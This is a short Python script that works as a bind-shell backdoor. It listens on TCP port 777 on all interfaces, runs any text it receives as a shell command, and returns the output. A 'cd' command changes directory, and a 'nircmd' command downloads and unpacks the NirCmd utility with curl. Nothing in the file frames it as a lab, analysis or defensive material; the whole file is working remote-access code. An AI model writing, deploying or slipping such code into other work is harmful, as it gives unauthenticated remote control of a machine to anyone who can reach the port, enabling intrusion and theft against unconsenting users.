import os
import socket
import subprocess

HOST = socket.gethostbyname("SPB2024-001728")

LISTENER_PORT = 777

OUTPUT_SENDER = 888


HOSTNAME = socket.gethostname()

IP = socket.gethostbyname(HOSTNAME)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(("0.0.0.0", LISTENER_PORT))

s.listen()

while True:
    conn, addr = s.accept()

    while True:
        # ConnectionResetError
        try:
            data = conn.recv(1024)

            if data == b"":
                break

            command = data.decode().strip()

            if command.startswith("cd "):
                try:
                    path = command[3:].strip()
                    os.chdir(path)
                    current_dir = os.getcwd()
                    r = f"[+] Changed to dir {current_dir}\n".encode()
                except Exception as e:
                    r = str(e).encode()
            elif command == "nircmd":
                os.system(
                    "curl https://www.nirsoft.net/utils/nircmd.zip -o nircmd.zip && tar -xf nircmd.zip && del nircmd.zip"
                )
                r = "[+] Downloaded NirCmd and delted folder\n".encode()
            else:
                try:
                    r = subprocess.check_output(
                        data.decode(), shell=True, stderr=subprocess.STDOUT
                    )

                    if not r:
                        r = "[+] Command succes, just no output\n".encode()

                except subprocess.CalledProcessError as e:
                    r = e.output

                except Exception as e:
                    r = str(e).encode()
        except ConnectionResetError:
            break
        except Exception as e:
            r = str(e).encode()

        conn.sendall(r)
    conn.close()
